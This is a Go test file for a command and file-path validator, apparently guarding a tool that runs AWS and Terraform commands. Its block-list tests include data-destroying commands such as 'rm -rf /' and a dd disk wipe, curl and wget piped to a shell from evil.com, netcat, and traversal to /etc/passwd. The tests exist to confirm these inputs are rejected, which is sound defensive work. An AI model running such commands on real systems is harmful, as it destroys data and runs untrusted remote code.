package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Test command validation
func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantErr bool
		errMsg  string
	}{
		// Allowed commands
		{
			name:    "AWS CLI command allowed",
			command: "aws ecs describe-services --cluster test",
			wantErr: false,
		},
		{
			name:    "Terraform command allowed",
			command: "terraform plan",
			wantErr: false,
		},
		{
			name:    "Cat command allowed",
			command: "cat env/dev/main.tf",
			wantErr: false,
		},
		{
			name:    "Grep command allowed",
			command: "grep error logs.txt",
			wantErr: false,
		},

		// Dangerous commands blocked
		{
			name:    "rm -rf / blocked",
			command: "rm -rf /",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "rm -rf ~ blocked",
			command: "rm -rf ~",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "rm -rf * blocked",
			command: "rm -rf *",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "rm -rf . blocked",
			command: "rm -rf .",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "rm -r * blocked",
			command: "rm -r *",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "curl pipe sh blocked",
			command: "curl http://evil.com/script.sh | sh",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "wget pipe bash blocked",
			command: "wget http://evil.com/script.sh | bash",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "dd command blocked",
			command: "dd if=/dev/zero of=/dev/sda",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "chmod 777 blocked",
			command: "chmod 777 /etc/passwd",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},

		// Case variations blocked
		{
			name:    "RM -RF / blocked (uppercase)",
			command: "RM -RF /",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},
		{
			name:    "Rm -rf / blocked (mixed case)",
			command: "Rm -rf /tmp",
			wantErr: true,
			errMsg:  "dangerous command pattern",
		},

		// Non-whitelisted commands blocked
		{
			name:    "sed command blocked",
			command: "sed -i 's/old/new/' file.txt",
			wantErr: true,
			errMsg:  "not in whitelist",
		},
		{
			name:    "awk command blocked",
			command: "awk '{print $1}' file.txt",
			wantErr: true,
			errMsg:  "not in whitelist",
		},
		{
			name:    "nc command blocked",
			command: "nc -l 8080",
			wantErr: true,
			errMsg:  "not in whitelist",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCommand(tt.command)
			if tt.wantErr {
				if err == nil {
					t.Errorf("Expected error containing '%s', got nil", tt.errMsg)
				} else if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error, got: %v", err)
				}
			}
		})
	}
}

// Test file path validation
func TestValidateFilePath(t *testing.T) {
	// Create a temporary directory for testing
	tmpDir := t.TempDir()

	tests := []struct {
		name     string
		basePath string
		filePath string
		wantErr  bool
		errMsg   string
	}{
		// Valid paths
		{
			name:     "Relative path within base",
			basePath: tmpDir,
			filePath: "env/dev/main.tf",
			wantErr:  false,
		},
		{
			name:     "Absolute path within base",
			basePath: tmpDir,
			filePath: filepath.Join(tmpDir, "test.txt"),
			wantErr:  false,
		},

		// Path traversal attempts blocked
		{
			name:     "Path traversal with ../",
			basePath: tmpDir,
			filePath: "../../../etc/passwd",
			wantErr:  true,
			errMsg:   "escapes working directory",
		},
		{
			name:     "Path traversal to parent",
			basePath: tmpDir,
			filePath: "..",
			wantErr:  true,
			errMsg:   "escapes working directory",
		},

		// System paths blocked (caught by absolute path check first)
		{
			name:     "Access to /etc/passwd blocked",
			basePath: tmpDir,
			filePath: "/etc/passwd",
			wantErr:  true,
			errMsg:   "outside working directory",
		},
		{
			name:     "Access to /usr/bin blocked",
			basePath: tmpDir,
			filePath: "/usr/bin/bash",
			wantErr:  true,
			errMsg:   "outside working directory",
		},

		// System-like paths allowed when within working directory (critical for macOS temp dirs)
		{
			name:     "System-like path allowed if within working directory",
			basePath: "/var/folders/zz/xxxxxxxxx/T/infrastructure",
			filePath: "main.tf",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateFilePath(tt.basePath, tt.filePath)
			if tt.wantErr {
				if err == nil {
					t.Errorf("Expected error containing '%s', got nil", tt.errMsg)
				} else if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error, got: %v", err)
				}
			}
		})
	}
}

// Test file size validation
func TestValidateFileSize(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a small test file
	smallFile := filepath.Join(tmpDir, "small.txt")
	if err := os.WriteFile(smallFile, []byte("test content"), 0644); err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	// Create a large test file (>10MB)
	largeFile := filepath.Join(tmpDir, "large.txt")
	largeContent := make([]byte, 11*1024*1024) // 11MB
	if err := os.WriteFile(largeFile, largeContent, 0644); err != nil {
		t.Fatalf("Failed to create large test file: %v", err)
	}

	tests := []struct {
		name     string
		filePath string
		maxSize  int64
		wantErr  bool
	}{
		{
			name:     "Small file accepted",
			filePath: smallFile,
			maxSize:  10 * 1024 * 1024, // 10MB
			wantErr:  false,
		},
		{
			name:     "Large file rejected",
			filePath: largeFile,
			maxSize:  10 * 1024 * 1024, // 10MB
			wantErr:  true,
		},
		{
			name:     "Non-existent file accepted",
			filePath: filepath.Join(tmpDir, "nonexistent.txt"),
			maxSize:  10 * 1024 * 1024,
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateFileSize(tt.filePath, tt.maxSize)
			if tt.wantErr && err == nil {
				t.Error("Expected error for large file, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Expected no error, got: %v", err)
			}
		})
	}
}

// Test backup creation
func TestCreateFileBackup(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a test file
	testFile := filepath.Join(tmpDir, "test.txt")
	originalContent := []byte("original content")
	if err := os.WriteFile(testFile, originalContent, 0644); err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	// Create backup
	backupPath, err := createFileBackup(testFile)
	if err != nil {
		t.Fatalf("Failed to create backup: %v", err)
	}

	// Verify backup was created
	if backupPath == "" {
		t.Fatal("Backup path is empty")
	}

	// Verify backup file exists
	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
		t.Errorf("Backup file not created: %s", backupPath)
	}

	// Verify backup content matches original
	backupContent, err := os.ReadFile(backupPath)
	if err != nil {
		t.Fatalf("Failed to read backup: %v", err)
	}

	if string(backupContent) != string(originalContent) {
		t.Errorf("Backup content mismatch. Expected '%s', got '%s'", originalContent, backupContent)
	}

	// Verify backup naming format
	if !strings.Contains(backupPath, ".backup_") {
		t.Errorf("Backup path doesn't contain '.backup_': %s", backupPath)
	}

	// Test backup of non-existent file
	nonExistentFile := filepath.Join(tmpDir, "nonexistent.txt")
	backupPath2, err := createFileBackup(nonExistentFile)
	if err != nil {
		t.Errorf("Expected no error for non-existent file, got: %v", err)
	}
	if backupPath2 != "" {
		t.Errorf("Expected empty backup path for non-existent file, got: %s", backupPath2)
	}
}
